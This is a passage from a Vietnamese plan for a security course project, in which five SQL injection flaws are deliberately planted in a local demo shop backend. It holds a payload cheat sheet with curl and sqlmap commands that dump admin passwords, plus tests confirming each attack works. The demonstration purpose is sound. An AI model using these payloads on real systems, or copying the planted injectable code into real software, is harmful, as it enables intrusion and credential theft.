time curl -s -o /dev/null -w "%{http_code}\n" \
  -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/customer/orders/my-orders/2%20AND%20IF(SUBSTRING((SELECT%20password%20FROM%20users%20WHERE%20username%3D%27admin%27),1,1)%3D%27%24%27%2CSLEEP(3)%2C0)"

echo "=== Test 2: ký tự đầu = 'X' (FALSE → ngay) ==="
time curl -s -o /dev/null -w "%{http_code}\n" \
  -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/customer/orders/my-orders/2%20AND%20IF(SUBSTRING((SELECT%20password%20FROM%20users%20WHERE%20username%3D%27admin%27),1,1)%3D%27X%27%2CSLEEP(3)%2C0)"
```
Expected:
- Test 1: status `200`, real time ≥ 3s
- Test 2: status `200`, real time < 1s

- [ ] **Step 7: Smoke test — request bình thường**

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/customer/orders/my-orders/2" | python3 -c "import json,sys; print(len(json.load(sys.stdin)),'orders for customer1')"
```
Expected: `0 orders for customer1` (chưa có order nào).

- [ ] **Step 8: Smoke test FE — trang Don-mua.html**

Login với `customer1`/`123456` ở http://localhost:5500/Dang-nhap.html, vào trang http://localhost:5500/Don-mua.html → hiển thị "Chưa có đơn hàng" hoặc empty list (không lỗi 500).

- [ ] **Step 9: Commit**

```bash
cd /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE
git add web_project/src/main/java/com/example/web_project/service/OrderService.java \
        web_project/src/main/java/com/example/web_project/controller/customer/CustomerOrderController.java
git commit -m "feat(vuln): cài Time-based Blind SQLi trong /api/customer/orders/my-orders/{userId}"
```

---

## Task 8: Tạo `DEMO-SQLI-PAYLOADS.md` cheat sheet

**Files:**
- Create: `docs/DEMO-SQLI-PAYLOADS.md` (repo root `BTL_ATBM/`)

- [ ] **Step 1: Tạo file cheat sheet**

File: `/Users/justminh/Desktop/DH/BTL_ATBM/docs/DEMO-SQLI-PAYLOADS.md`

```markdown
# 🎯 Cheat Sheet — Demo 5 SQLi trên HPB-Shop

> Dùng khi thuyết trình BTL ATBM. Mở file này trong VSCode preview hoặc print để cầm theo.
> Trước khi demo: `git checkout feat/sqli-demo` ở `HPB-Shop-BE`, restart backend.
> Sau demo cần show "bản đã fix": chiếu repo HPB-Shop-BE ở `main` (chưa cài lỗ hổng).

---

## 🔴 Lỗ hổng 1 — Auth Bypass

**URL:** `http://localhost:5500/Dang-nhap.html`

**Payload (gõ vào form):**
- Username: `admin' --`
- Password: `bất kỳ`

**Curl test:**
```bash
curl -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d "{\"loginId\":\"admin' --\",\"password\":\"x\"}"
```

**sqlmap (auth bypass detect):**
```bash
sqlmap -u "http://localhost:8080/api/auth/login" \
  --method POST --data '{"loginId":"admin","password":"x"}' \
  --headers "Content-Type: application/json" \
  --level 5 --risk 3 --batch
```

---

## 🔴 Lỗ hổng 2 — UNION-based

**URL:** `http://localhost:5500/Trang-chu.html` (gõ vào ô tìm kiếm)

**Payload:**
```
%' UNION SELECT user_id, username, email, 0, password, role, 0, 'hack' FROM users--
```

**Curl test (URL-encoded):**
```bash
curl "http://localhost:8080/api/products/search?keyword=%25%27%20UNION%20SELECT%20user_id%2Cusername%2Cemail%2C0%2Cpassword%2Crole%2C0%2C%27hack%27%20FROM%20users--"
```

**sqlmap dump bảng users:**
```bash
sqlmap -u "http://localhost:8080/api/products/search?keyword=test" \
  --batch --dbs
sqlmap -u "http://localhost:8080/api/products/search?keyword=test" \
  --batch -D HPBSports_DB --tables
sqlmap -u "http://localhost:8080/api/products/search?keyword=test" \
  --batch -D HPBSports_DB -T users --dump
```

---

## 🔴 Lỗ hổng 3 — Error-based

**URL:** Sửa thẳng URL trên trình duyệt:
```
http://localhost:8080/api/products/1 AND extractvalue(1,concat(0x7e,(SELECT version())))
```

**Payload (path):**
```
1 AND extractvalue(1, concat(0x7e, (SELECT version())))
1 AND extractvalue(1, concat(0x7e, (SELECT database())))
1 AND extractvalue(1, concat(0x7e, (SELECT password FROM users WHERE username='admin')))
```

**Curl (URL-encoded):**
```bash
curl "http://localhost:8080/api/products/1%20AND%20extractvalue(1,concat(0x7e,(SELECT%20version())))"
```

**sqlmap:**
```bash
sqlmap -u "http://localhost:8080/api/products/1" \
  --technique=E --batch --current-user --current-db --dbs
```

---

## 🔴 Lỗ hổng 4 — Boolean Blind

**URL:** `http://localhost:5500/San-pham-theo-hang.html?brand=...` (hoặc test qua API)

**Payload (URL parameter `brand=`):**
```
Yonex' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='$'--
```

**Curl test (URL-encoded):**
```bash
# TRUE → trả về sản phẩm Yonex
curl "http://localhost:8080/api/products/filter?brand=Yonex%27%20AND%201%3D1--"
# FALSE → empty
curl "http://localhost:8080/api/products/filter?brand=Yonex%27%20AND%201%3D2--"
```

**sqlmap (boolean technique):**
```bash
sqlmap -u "http://localhost:8080/api/products/filter?brand=Yonex" \
  --technique=B --batch -D HPBSports_DB -T users -C username,password --dump
```

---

## 🔴 Lỗ hổng 5 — Time-based Blind

**URL:** `/api/customer/orders/my-orders/{userId}` — yêu cầu JWT customer.

**Bước 1: Lấy JWT (login customer1):**
```bash
TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"loginId":"customer1","password":"123456"}' \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['token'])")
echo $TOKEN
```

**Bước 2: Payload (path):**
```
2 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='$',SLEEP(3),0)
```

**Curl test (URL-encoded):**
```bash
time curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/customer/orders/my-orders/2%20AND%20IF(SUBSTRING((SELECT%20password%20FROM%20users%20WHERE%20username%3D%27admin%27),1,1)%3D%27%24%27%2CSLEEP(3)%2C0)"
# Expected: real time ≥ 3s nếu ký tự đầu = '$'
```

**sqlmap (time-based technique):**
```bash
sqlmap -u "http://localhost:8080/api/customer/orders/my-orders/2" \
  --headers "Authorization: Bearer $TOKEN" \
  --technique=T --batch \
  -D HPBSports_DB -T users -C username,password --dump
```

---

## 📋 Workflow demo trên buổi thuyết trình (~7-8 phút)

| Phút | Bước | Action |
|------|------|--------|
| 0:00 | Mở trang chủ HPB-Shop, chiếu cửa hàng "bình thường" | http://localhost:5500/Trang-chu.html |
| 0:30 | **Auth Bypass** | Login `admin' --` → vào Admin Dashboard |
| 1:30 | **UNION-based** | Logout → ô tìm kiếm trang chủ → dump users |
| 3:00 | **Error-based** | Sửa URL chi tiết sản phẩm → leak version + password |
| 4:00 | **Boolean Blind** | Chạy `sqlmap --technique=B` → password admin |
| 5:30 | **Time-based** | Chạy `sqlmap --technique=T` (giải thích "không trả lỗi nhưng vẫn dump được") |
| 7:00 | **So sánh** | Chiếu repo HPB-Shop-BE branch `main` → "đây là bản dùng JPA prepared statement, payload trên đều thất bại" |

---

## ♻️ Khôi phục bản an toàn

Sau demo, để khôi phục cho lần sử dụng/phát triển sau:
```bash
cd /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE
git checkout main
# Restart backend
lsof -ti:8080 | xargs kill -9; mvn spring-boot:run
```

Branch `feat/sqli-demo` vẫn lưu lại để dùng cho buổi demo sau (nếu cần).
```

- [ ] **Step 2: Verify file render OK**

```bash
ls -la /Users/justminh/Desktop/DH/BTL_ATBM/docs/DEMO-SQLI-PAYLOADS.md
wc -l /Users/justminh/Desktop/DH/BTL_ATBM/docs/DEMO-SQLI-PAYLOADS.md
```
Expected: file ≥ 100 dòng, tồn tại.

- [ ] **Step 3: Commit ở root git (vì file ở `docs/` của root, không phải BE)**

```bash
cd /Users/justminh/Desktop/DH/BTL_ATBM
git add docs/DEMO-SQLI-PAYLOADS.md
git commit -m "docs: thêm cheat sheet 5 payload SQLi + workflow demo"
```

---

## Task 9: End-to-end smoke test

Mục tiêu: chạy cả 5 attack lần lượt + verify FE bình thường, đảm bảo không có regression.

- [ ] **Step 1: Verify backend đang chạy ở branch `feat/sqli-demo`**

```bash
cd /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE
git branch --show-current
git log --oneline | head -8
```
Expected: branch `feat/sqli-demo`, log có 7+ commit (1 baseline + 6 feature commits).

- [ ] **Step 2: Test cả 5 attack liên tiếp**

```bash
echo "=== 1. Auth Bypass ==="
curl -s -X POST http://localhost:8080/api/auth/login -H "Content-Type: application/json" \
  -d "{\"loginId\":\"admin' --\",\"password\":\"x\"}" \
  | python3 -c "import json,sys; d=json.load(sys.stdin); print('PASS' if d.get('user',{}).get('role')=='admin' else 'FAIL')"

echo "=== 2. UNION-based ==="
curl -s "http://localhost:8080/api/products/search?keyword=%25%27%20UNION%20SELECT%20user_id%2Cusername%2Cemail%2C0%2Cpassword%2Crole%2C0%2C%27hack%27%20FROM%20users--" \
  | python3 -c "import json,sys; d=json.load(sys.stdin); has_users=any(item.get('description')=='admin' for item in d); print('PASS' if has_users else 'FAIL')"

echo "=== 3. Error-based ==="
curl -s "http://localhost:8080/api/products/1%20AND%20extractvalue(1,concat(0x7e,(SELECT%20version())))" \
  | python3 -c "import json,sys; d=json.load(sys.stdin); msg=str(d.get('message','')); print('PASS' if 'XPATH' in msg or 'syntax error' in msg else 'FAIL'); print(' ', msg[:100])"

echo "=== 4. Boolean Blind ==="
TRUE_COUNT=$(curl -s "http://localhost:8080/api/products/filter?brand=Yonex%27%20AND%201%3D1--" | python3 -c "import json,sys; print(len(json.load(sys.stdin)))")
FALSE_COUNT=$(curl -s "http://localhost:8080/api/products/filter?brand=Yonex%27%20AND%201%3D2--" | python3 -c "import json,sys; print(len(json.load(sys.stdin)))")
[ "$TRUE_COUNT" -gt 0 ] && [ "$FALSE_COUNT" -eq 0 ] && echo "PASS (TRUE=$TRUE_COUNT, FALSE=$FALSE_COUNT)" || echo "FAIL (TRUE=$TRUE_COUNT, FALSE=$FALSE_COUNT)"

echo "=== 5. Time-based Blind ==="
TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login -H "Content-Type: application/json" -d '{"loginId":"customer1","password":"123456"}' | python3 -c "import json,sys; print(json.load(sys.stdin)['token'])")
START=$(date +%s)
curl -s -o /dev/null -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/customer/orders/my-orders/2%20AND%20IF(SUBSTRING((SELECT%20password%20FROM%20users%20WHERE%20username%3D%27admin%27),1,1)%3D%27%24%27%2CSLEEP(3)%2C0)"
END=$(date +%s)
ELAPSED=$((END-START))
[ "$ELAPSED" -ge 3 ] && echo "PASS (delay ${ELAPSED}s)" || echo "FAIL (delay only ${ELAPSED}s)"
```
Expected: 5 dòng `PASS`.

- [ ] **Step 3: Smoke test FE — kiểm tra UI không gãy**

Mở browser, kiểm tra từng trang:
- [x] http://localhost:5500/Trang-chu.html — Hiện 12 sản phẩm bình thường
- [x] http://localhost:5500/San-pham-theo-hang.html?brand=Yonex — 4 sản phẩm Yonex
- [x] http://localhost:5500/Chi-tiet-san-pham.html?id=1 — Chi tiết "Yonex Astrox 99 Pro"
- [x] http://localhost:5500/Dang-nhap.html → login `admin`/`admin123` → vào Admin Dashboard OK
- [x] http://localhost:5500/Dang-nhap.html → login `customer1`/`123456` → vào trang khách OK
- [x] http://localhost:5500/Don-mua.html (sau khi login customer) — Hiển thị "không có đơn" hoặc list, không lỗi

- [ ] **Step 4: Verify "bản đã fix" hoạt động đúng (chuyển branch `main`)**

```bash
cd /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE
git stash 2>&1  # nếu có working changes
git checkout main
# Restart
lsof -ti:8080 | xargs kill -9 2>/dev/null || true
sleep 2
export JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk-25.jdk/Contents/Home
export PATH=$JAVA_HOME/bin:$PATH
cd /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE/web_project
nohup mvn -DskipTests spring-boot:run > /tmp/hpb-backend.log 2>&1 &
for i in $(seq 1 30); do
  curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/api/products | grep -q 200 && break
  sleep 1
done

echo "=== Verify Auth Bypass thất bại trên main ==="
curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d "{\"loginId\":\"admin' --\",\"password\":\"x\"}"
```
Expected: `401` (an toàn). Sau khi verify xong, chuyển lại branch demo:
```bash
cd /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE
git checkout feat/sqli-demo
# Restart backend lần cuối để sẵn sàng demo
lsof -ti:8080 | xargs kill -9 2>/dev/null || true
sleep 2
cd web_project
nohup mvn -DskipTests spring-boot:run > /tmp/hpb-backend.log 2>&1 &
```

- [ ] **Step 5: Tổng kết git history**

```bash
echo "=== HPB-Shop-BE branch feat/sqli-demo ==="
cd /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE
git log --oneline main..feat/sqli-demo

echo ""
echo "=== Root project (BTL_ATBM) ==="
cd /Users/justminh/Desktop/DH/BTL_ATBM
git log --oneline
```
Expected:
- HPB-Shop-BE feat/sqli-demo có 7 commit (config baseline + 6 feature)
- Root có ≥ 2 commit (initial + DEMO-SQLI-PAYLOADS.md)

---

## Definition of Done — Checklist cuối cùng

- [ ] 5 lỗ hổng đều demo được bằng tay (Step 2 Task 9 báo 5/5 PASS)
- [ ] FE 6 trang đều hoạt động bình thường khi không có payload (Step 3 Task 9)
- [ ] `git checkout main` ở HPB-Shop-BE → tất cả payload đều thất bại (Step 4 Task 9)
- [ ] File `docs/DEMO-SQLI-PAYLOADS.md` tồn tại và đầy đủ 5 mục
- [ ] Branch `feat/sqli-demo` có 7 commit có ý nghĩa
- [ ] Backend không crash khi nhận payload bất thường (catch xử lý đẹp)
